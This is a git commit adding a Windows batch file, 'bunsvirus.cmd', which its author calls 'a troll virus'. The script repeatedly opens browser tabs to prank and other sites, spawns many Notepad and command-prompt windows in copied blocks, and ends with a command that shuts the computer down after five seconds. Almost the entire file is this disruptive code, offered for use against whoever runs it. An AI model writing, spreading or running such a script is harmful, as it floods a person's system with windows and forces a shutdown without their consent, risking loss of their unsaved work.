3bb52b48abe3a23a119e97b19eb3f7b2dcf6d031
oleksandrduma2015-cmd <oleksandrduma2015@gmail.com>
2026-02-18 22:26:50 -0600

    Add files via upload
    this is a troll virus

---
+++ bunsvirus.cmd
@@ -0,0 +1,771 @@
+@echo off
+cls
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+tart https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+tart https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+tart https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+tart https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+tart https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+tart https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+tart https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+tart https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start https://lol.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start http://youraidiot.com/
+start https://hello.com/
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://hello.com/ 
+start https://www.youtube.com/watch?v=SF1wxa5Z28g
+start notepad LOL 
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start notepad
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+start command prompt
+shutdown -s -t 5
